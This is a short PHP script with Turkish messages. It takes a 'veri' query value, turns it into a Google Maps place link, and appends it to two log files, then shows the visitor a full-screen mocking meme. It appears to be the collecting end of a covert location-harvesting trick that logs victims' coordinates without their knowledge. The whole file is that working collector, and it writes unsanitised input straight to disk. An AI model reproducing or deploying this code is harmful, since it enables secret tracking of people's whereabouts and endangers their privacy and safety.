<?php 

if (isset($_GET["veri"])) {

	$ac1 = fopen("map.txt", "a+");
	$veri = ("https://www.google.com/maps/place/".$_GET["veri"]);
	fwrite($ac1, $veri);
	fclose($ac1);
	$ac = fopen("old.txt", "a+");
	$veri = ("https://www.google.com/maps/place/".$_GET["veri"]."\n");
	fwrite($ac, $veri);
	fclose($ac);

?>
<img src="http://3.bp.blogspot.com/-ozfOEA8bc1k/U5YcPtk5sRI/AAAAAAAAEhs/kMCvLvP8UUc/s1600/barack-obama-nah-cekiyor.jpg" alt="" height="100%" width="100%">
<?php	

}
else{
	echo "Lütfen bir veri giriniz.";
}



 ?>